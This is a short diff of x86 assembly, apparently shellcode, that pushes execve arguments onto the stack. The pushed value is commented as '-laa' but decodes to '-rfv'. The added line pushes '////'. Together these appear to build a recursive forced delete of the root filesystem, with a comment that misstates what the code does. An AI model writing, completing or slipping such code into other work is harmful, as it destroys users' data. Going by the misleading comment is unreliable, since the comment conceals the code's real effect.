@@ -16,6 +16,7 @@ _start:
 
     push eax                ;push null eax register to the stack
     push 0x7666722d         ;push argument to the stack "-laa"
+    push 0x2f2f2f2f
     mov esi, esp            ;move stack pointer to esi
 
     push eax                ;push null eax register to the stack
